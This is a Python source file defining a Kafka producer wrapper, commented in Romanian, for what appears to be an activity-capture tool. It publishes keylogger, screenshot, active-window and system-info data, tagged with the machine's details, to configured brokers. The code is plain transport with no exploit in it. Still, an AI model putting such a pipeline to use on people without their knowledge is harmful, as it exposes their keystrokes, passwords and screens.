from kafka import KafkaProducer
from kafka.errors import KafkaError
import json
from capturing.SystemTracker import SystemTracker

class KafkaProducerWrapper:
    
    ACTIVE_WINDOW_TOPIC = 'ro.popa.active-window.new'
    SYSTEM_INFO_TOPIC = 'ro.popa.system-info.new'
    KEYLOGGER_TOPIC = 'ro.popa.keylogger.new'
    SCREENSHOT_TOPIC = 'ro.popa.screenshot.new'
    no_broker_available = False
    """
    bootstrap_servers: list of kafka brokers
    example: [localhost:9092]
    """
    def __init__(self, bootstrap_servers):
        self.producer = KafkaProducer(
            bootstrap_servers=bootstrap_servers,
            # Ce se trimite va fi trimis in format json
            value_serializer=lambda v: json.dumps(v).encode('utf-8'),
            retries=3 # Se incearca trimiterea mesajului de 3 ori
        )
        
    def send_message(self, topic, data):
        try:
            payload = {
                "user": SystemTracker.system_info,
                "data": data
            }
            future = self.producer.send(topic, payload)
            self.producer.flush()
            print("Sent kafka message...:", payload)
            return future.get()
        except KafkaError as e:
            # TODO:Logging error
            print(f"Kafka error: {e}")
            return None
        
    def close(self):
        self.producer.close()